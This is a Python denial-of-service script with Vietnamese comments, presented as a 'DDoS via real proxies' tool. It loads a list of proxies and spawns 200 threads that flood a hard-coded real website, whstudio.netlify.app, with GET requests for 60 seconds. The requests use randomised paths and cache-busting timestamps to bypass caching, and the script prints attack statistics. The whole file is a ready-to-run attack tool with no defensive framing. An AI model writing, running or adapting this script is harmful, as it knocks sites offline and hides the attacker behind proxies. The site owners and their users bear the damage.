#!/usr/bin/env python3
# ddos_proxy.py - DDoS sử dụng proxy thật, chạy sau proxy_generator.py

import threading
import random
import time
import sys
import requests
import os

# ===== CẤU HÌNH =====
TARGET_URL = "https://whstudio.netlify.app"   # ĐỔI URL Ở ĐÂY
THREADS = 200
DURATION = 60
PROXY_FILE = "working_proxies.txt"
REQUEST_TIMEOUT = 3

running = True
stats_lock = threading.Lock()
total_requests = 0
failed_requests = 0
proxy_list = []
proxy_lock = threading.Lock()

def load_proxies():
    if not os.path.exists(PROXY_FILE):
        print(f"[-] Không tìm thấy {PROXY_FILE}. Chạy lệnh: python proxy_generator.py")
        sys.exit(1)
    with open(PROXY_FILE, "r") as f:
        proxies = [line.strip() for line in f if line.strip()]
    if not proxies:
        print(f"[-] File {PROXY_FILE} rỗng. Chạy lại proxy_generator.py.")
        sys.exit(1)
    print(f"[+] Đã tải {len(proxies)} proxy từ {PROXY_FILE}")
    return proxies

def get_random_proxy():
    with proxy_lock:
        return random.choice(proxy_list)

def attack_worker():
    global total_requests, failed_requests, running
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    while running:
        proxy_str = get_random_proxy()
        proxies = {"http": f"http://{proxy_str}", "https": f"https://{proxy_str}"}
        try:
            random_path = f"/{random.randint(1,999999)}?t={int(time.time()*1000)}"
            url = TARGET_URL.rstrip("/") + random_path
            # Gửi GET không chờ response đầy đủ để tăng tốc
            resp = session.get(url, proxies=proxies, timeout=REQUEST_TIMEOUT, allow_redirects=False, stream=True)
            resp.close()
            with stats_lock:
                total_requests += 1
        except Exception:
            with stats_lock:
                failed_requests += 1

def stats_display():
    global running, total_requests, failed_requests
    start = time.time()
    last_total = 0
    print("\n" + "="*60)
    print(f"TẤN CÔNG DDOS QUA PROXY")
    print(f"Mục tiêu: {TARGET_URL}")
    print(f"Số proxy: {len(proxy_list)} | Luồng: {THREADS} | Thời gian: {DURATION}s")
    print("="*60)
    print("Thời gian | Tổng req | Req/s | Thất bại")
    print("-"*45)
    while running:
        time.sleep(1)
        elapsed = int(time.time() - start)
        with stats_lock:
            curr_total = total_requests
            curr_fail = failed_requests
        rate = curr_total - last_total
        last_total = curr_total
        print(f"{elapsed:>5}s   | {curr_total:>8} | {rate:>5} | {curr_fail:>8}")
        if elapsed >= DURATION:
            running = False
            break
    print("-"*45)
    print(f"KẾT THÚC. Tổng request: {total_requests} | Thất bại: {failed_requests} | Tỉ lệ thành công: {(total_requests/(total_requests+failed_requests+0.001))*100:.1f}%")

def main():
    global proxy_list
    proxy_list = load_proxies()
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=attack_worker)
        t.daemon = True
        t.start()
        threads.append(t)
    stats_display()
    # Dừng tất cả
    for t in threads:
        t.join(timeout=0.2)
    print("[+] Hoàn tất tấn công.")

if __name__ == "__main__":
    main()
